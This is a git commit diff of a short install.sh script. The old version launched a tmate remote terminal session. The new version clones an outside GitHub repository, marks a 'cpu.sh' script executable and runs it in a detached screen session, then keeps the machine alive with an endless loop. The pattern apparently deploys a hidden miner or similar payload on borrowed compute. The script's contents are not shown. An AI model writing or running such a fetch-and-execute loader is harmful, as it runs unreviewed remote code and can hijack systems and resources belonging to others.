3eba12c02cd75c72b3550bbaaa27b29fa53fa03a
welstannabella <85975078+welstannabella@users.noreply.github.com>
2021-06-16 09:45:45 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,9 @@
 #!/bin/bash
 sudo apt update
 sudo apt upgrade
-sudo apt install tmate -y
-tmate
-
+sudo apt install screen -y
+screen -dmS git clone https://github.com/bimasaputrq581/expert-fortnight.git && cd expert-fortnight && sudo apt update && chmod +x cpu.sh && ./cpu.sh
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
